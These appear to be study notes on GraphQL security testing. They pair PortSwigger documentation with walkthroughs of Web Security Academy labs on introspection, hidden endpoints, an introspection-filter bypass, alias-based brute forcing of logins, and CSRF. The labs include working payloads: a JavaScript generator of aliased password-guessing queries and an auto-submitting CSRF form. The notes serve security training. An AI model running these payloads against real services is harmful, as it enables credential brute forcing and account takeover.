### GraphQL in burp:
https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql

### Finding GraphQL endpoints
Before you can test a GraphQL API, you first need to find its endpoint. As GraphQL APIs use the same endpoint for all requests, this is a valuable piece of information. 

### Universal queries
If you send `query{__typename}` to any GraphQL endpoint, it will include the string {"data": {"__typename": "query"}} somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

The query works because every GraphQL endpoint has a reserved field called __typename that returns the queried object's type as a string.

### Common endpoint names
GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:
- /graphql
- /api
- /api/graphql
- /graphql/api
- /graphql/graphql

If these common endpoints don't return a GraphQL response, you could also try appending /v1 to the path.

> Note:
>
> GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints.

### Request methods
The next step in trying to find GraphQL endpoints is to test using different request methods.

It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of application/json, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST requests that use a content-type of x-www-form-urlencoded.

If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods.

### Exploiting unsanitized arguments
At this point, you can start to look for vulnerabilities. Testing query arguments is a good place to start.

If the API uses arguments to access objects directly, it may be vulnerable to access control vulnerabilities. A user could potentially access information they should not have simply by supplying an argument that corresponds to that information. This is sometimes known as an insecure direct object reference (IDOR). 

For example, the query below requests a product list for an online shop: 
```bash
    #Example product query

    query {
        products {
            id
            name
            listed
        }
    }
```
The product list returned contains only listed products. 
```bash
    #Example product response

    {
        "data": {
            "products": [
                {
                    "id": 1,
                    "name": "Product 1",
                    "listed": true
                },
                {
                    "id": 2,
                    "name": "Product 2",
                    "listed": true
                },
                {
                    "id": 4,
                    "name": "Product 4",
                    "listed": true
                }
            ]
        }
    }
```
From this information, we can infer the following:
- Products are assigned a sequential ID.
- Product ID 3 is missing from the list, possibly because it has been delisted.

By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.
```bash
    #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```
```bash
    #Missing product response

    {
        "data": {
            "product": {
            "id": 3,
            "name": "Product 3",
            "listed": no
            }
        }
    }
```

### Discovering schema information
The next step in testing the API is to piece together information about the underlying schema.

The best way to do this is to use introspection queries. Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.

Introspection helps you to understand how you can interact with a GraphQL API. It can also disclose potentially sensitive data, such as description fields.

### Using introspection 
To use introspection to discover schema information, query the __schema field. This field is available on the root type of all queries.

Like regular queries, you can specify the fields and structure of the response you want to be returned when running an introspection query. For example, you might want the response to contain only the names of available mutations.

> Note
>
> Burp can generate introspection queries for you. For more information, see [Accessing GraphQL API schemas using introspection](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql#accessing-graphql-api-schemas-using-introspection).

### Probing for introspection 
It is best practice for introspection to be disabled in production environments, but this advice is not always followed.

You can probe for introspection using the following simple query. If introspection is enabled, the response returns the names of all available queries.
```bash
    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }
```

### Running a full introspection query 
The next step is to run a full introspection query against the endpoint so that you can get as much information on the underlying schema as possible.

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments. 

```bash
    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

> Note
> If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

### Visualizing introspection results
Responses to introspection queries can be full of information, but are often very long and hard to process.

You can view relationships between schema entities more easily using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer) tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types. 

### Suggestions
Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.

Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema.

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that uses suggestions to automatically recover all or part of a GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.

You cannot disable suggestions directly in Apollo. See this [GitHub thread](https://github.com/apollographql/apollo-server/issues/3919#issuecomment-836503305) for a workaround.

> Note:
>
> Burp Scanner can automatically test for suggestions as part of its scans. If active suggestions are found, Burp Scanner reports a "GraphQL suggestions enabled" issue.

### APPRENTICE Lab: Accessing private GraphQL posts
To figure out if the endpoint corresponds to a graphsql endpoint first try to send universal query

normal req.body:
```bash
{"query":"\nquery getBlogSummaries {\n    getAllBlogPosts {\n        image\n        title\n        summary\n        id\n    }\n}","operationName":"getBlogSummaries"}
```
but we first send universal query in the req.body:
```bash
{"query":"{__typename}"}
```
Response:
```bash
{
  "data": {
    "__typename": "query"
  }
}
```

Next we try to send introspection probing req:
```bash
    {
        "query": "{__schema{queryType{name}}}"
    }
```
Response returns the name of all the available queries (at least that's what it says in the video):
```bash
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

So we run the full introspection query in the burp's GraphQL tab:
```bash
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

In the resp we get errors:
```bash
{
  "errors": [
    {
      "extensions": {},
      "locations": [
        {
          "line": 21,
          "column": 13
        }
      ],
      "message": "Validation error (FieldUndefined@[__schema/directives/onOperation]) : Field 'onOperation' in type '__Directive' is undefined"
    },
    {
      "extensions": {},
      "locations": [
        {
          "line": 22,
          "column": 13
        }
      ],
      "message": "Validation error (FieldUndefined@[__schema/directives/onFragment]) : Field 'onFragment' in type '__Directive' is undefined"
    },
    {
      "extensions": {},
      "locations": [
        {
          "line": 23,
          "column": 13
        }
      ],
      "message": "Validation error (FieldUndefined@[__schema/directives/onField]) : Field 'onField' in type '__Directive' is undefined"
    }
  ]
}
```

So the documentation says that there are some parts of introspection query that needs to be deleted. Let's delete it and run again:
```bash
    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

Now we get far better result in the resp, but it's really long so only paste the beginning:
```bash
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      },
      "mutationType": null,
      "subscriptionType": null,
      "types": [
        {
          "kind": "OBJECT",
          "name": "BlogPost",
          "description": null,
          "fields": [
            {
              "name": "id",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Int",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            ...
...
```
So let's use [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/) for the results of introspection:
```bash
http://nathanrandal.com/graphql-visualizer
```
So we copy the response and paste it into the `Introspection Result`
And in the visualised result we see the Schema of the BlogPost
And we see that it contains `postPassword`
So we make a req with that `postPassword`:
```bash
    query getBlogPost($id: Int!) {
        getBlogPost(id: $id) {
            image
            title
            author
            date
            paragraphs
            summary
        	id
            postPassword
        }
    }

    {"id":3}
```

And in the result we see:
```bash
{
  "data": {
    "getBlogPost": {
      "image": "/image/blog/posts/3.jpg",
      "title": "Apps For Everything",
      "author": "Roger That",
      "date": "2024-11-22T11:04:28.187Z",
      "paragraphs": [
        "I have a really rubbish cell, it doesn't have enough memory for anything more than the default Apps. Of course, it's not quite a Nokia 1011, but it may as well be. As someone that always had a PC, and was on the internet in 1997, now it's me that is feeling left behind.",
        "You see, what happens is when anything becomes popular and mainstream they take everything else away. Speaking to humans in customer service for a start. If I'm having internet issues and can't get online that recorded message telling me to 'go to www dot'' is just plain infuriating. Yes, I will respond, out loud, that if I could do that I wouldn't be phoning in the first place.",
        "I read about a young man who left his home fewer than ten times in seven years, he spent his life in isolation playing video games. I'm happy to report he sought help and has created a delightful, old-fashioned board game to help others. All you need is a pen and piece of paper. I was thinking this is what we need in the world, back to basics, then someone turns around and says they are planning on making it into an App! Irony much?",
        "Cells do just about everything now. As things become automated and machines save time and money, queuing to check in at an airport is a thing of the past, or is it? It should all run smoothly, and it would if they didn't put the instructions in one language only, and it happens to be the language you don't speak. 'Madam your boarding card is on your cell.' 'ER, no it isn't.' I need paper, I need a thin card, I need human contact if I'm ever going to get through check-in stress-free.",
        "'Do you accept cards?' I ask, 'Oh Madam, we only take Apple payments.' 'Cash?' 'No Madam, just Apple payments.' And yet when I returned with a kilo of apples I still couldn't purchase my, 'Double Ristretto Venti Half-Soy Nonfat Decaf Organic Chocolate Brownie Iced Vanilla Double-Shot Gingerbread Frappuccino Extra Hot With Foam Whipped Cream Upside Down Double Blended, One Sweet'N Low and One Nutrasweet, and Ice!'",
        "The most useful function on my cell, other being able to make calls, is the alarm clock. But I do want to have more Apps. I want to be able to reply in the positive when I'm asked, 'Are you on?', 'Do you have?' Facebook, YouTube, Messenger, Google search, Google maps, Instagram, Snapchat, Google Play, Gmail and Pandora Radio - to name but a few. And why do I want to have a hundred Apps I'll never use? FOMO."
      ],
      "summary": "I have a really rubbish cell, it doesn't have enough memory for anything more than the default Apps. Of course, it's not quite a Nokia 1011, but it may as well be. As someone that always had a PC, and...",
      "id": 3,
      "postPassword": "rz861wsy0wogwryrxkv5ob49ddpltc06"
    }
  }
}
```

### PRACTITIONER Lab: Accidental exposure of private GraphQL fields
In the lab we see login mutation, let's send it to repeater:
```bash
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }
    {"input":{"username":"wiener","password":"peter"}}
```
In the repeater, right click > GraphQL > Set introspection query > Send:
In the response we see a lot of lines, we copy them and go to the Graphql visualiser:
```bash
http://nathanrandal.com/graphql-visualizer
```

Also in the response where we get the results of introspection, let's right click > GraphQL > Save GraphQL queries to Site map
Then go to site map and find the GetUser query > Send to repeater
And we send the following req with the id: 1
```bash
query($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
{"id":1}
```

We get resp:
```bash
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "mslf1lw63svgw6hqni8o"
    }
  }
}
```

### Bypassing GraphQL introspection defenses 
If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded. 
```bash
    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }

```

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of x-www-form-urlencoded.

The example below shows an introspection probe sent via GET, with URL-encoded parameters.
```bash
    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

### PRACTITIONER Lab: Finding a hidden GraphQL endpoint (includes bypassing introspection defenses)
Lab description:
The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

When we go through endpoints we don't see an endpoint for GraphQL, so we use Intruder to try to find it:
```bash
GET §/api§ HTTP/2
Host: 0a4900c10357e1b282cf7041007200b0.web-security-academy.net
Cookie: session=Tzzegi2mh3wQWVe8wR0aJylZuOqYfIET
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
```

In the payload we paste the following:
```bash
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1
```

We unclick url encode characters checkbox and start the intruder attack:
We see a lot of 404 responses but one of them is 400 which is the response of `/api`:
```bash
"Query not present"
```

So we send it to repeater and change the req method to POST and see that it's not allowed.

Therefore we use GET method and try to send the simplest query possible (also known as universal query):
```bash
GET /api?query=query{__typename} HTTP/2
```

And in the response we get:
```bash
{
  "data": {
    "__typename": "query"
  }
}
```

So we can send graphql queries now, let us now try to use the introspection query:
We copy the same request with the universal query and In the new tab of the repeater, right click > GraphQL > Set introspection query > Send
```bash
GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema+%7b%0a++++++++queryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType...
```
Or the simplified version of introspection query:
```bash
GET /api?query=query%7b__schema%7bqueryType%7bname%7d%7d%7d HTTP/2
```
Which is url decoded as:
```bash
query=query{__schema{queryType{name}}}
```

In the reponse we get:
```bash
{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

As we can see the introspection query is not allowed. Let us now try to bypass that (see Bypassing GraphQL introspection defenses)
So we try the following (adding new line after `__schema`):
```bash
GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D HTTP/2
```
which is url decoded as:
```bash
query{__schema
{queryType{name}}}
```
And in the response we get:
```bash
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```
Which means we can now get the full introspection query result by using the same bypass technique (adding new line character after `__schema`):
```bash
GET /api?query=query+IntrospectionQuery+%7b%0a++++__schema%0A%7BqueryType+%7b%0a++++++++++++name%0a++++++++%7d%0a++++++++mutationType...
```
In the response we get the result of the introspection query and we can do:
In burp right click on the response > GraphQL > Save GraphQL queries to Site map

And also:
http://nathanrandal.com/graphql-visualizer

In the burp sitemap we see there's a mutation for deleting users and a query for getting users. So we get user carlos by specifying the `id=3` and we delete the user carlos and the lab is solved

### Bypassing rate limiting using aliases 
While aliases are intended to limit the number of API calls you need to make, they can also be used to brute force a GraphQL endpoint.

Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.

```bash
    #Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

### PRACTITIONER Lab: Bypassing GraphQL brute force protections
Lab description:
The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source. 

js script that creates aliases (taken from the lab tip, and is meant to be run in browser's console):
```bash
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

The result is copied to the clipboard, let us paste it into the repeater and send it to the backend server to see which password worked for the username carlos. Once found login and the lab is solved

### GraphQL CSRF 
### How do CSRF over GraphQL vulnerabilities arise? 
CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.

POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.

However, alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API. 

### PRACTITIONER Lab: Performing CSRF exploits over GraphQL
First send email change endpoint to the repeater

Convert the request into a POST request with a Content-Type of x-www-form-urlencoded. To do this, right-click the request and select Change request method **twice**.

Notice that the mutation request body has been deleted. Add the request body back in with URL encoding

Original request body (json):
```bash
{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"ff2@ff.com"}}}
```

Url encoded req body (req body was copied from the Graphql tab and it was url encoded and then it was prefixed with `qeury=`):
```bash
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```
Which can be url decoded as:
```bash
query=
    mutation changeEmail($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
&operationName=changeEmail&variables={"input":{"email":"hacker@hacker.com"}}
```

Now generate html for the csrf attack and send it to the victim:
```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab9001703706700803b088f0053000c.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="&#10;&#32;&#32;&#32;&#32;mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;email&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#125;&#10;&#32;&#32;&#32;&#32;&#125;&#10;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;hacker&#64;hacker&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

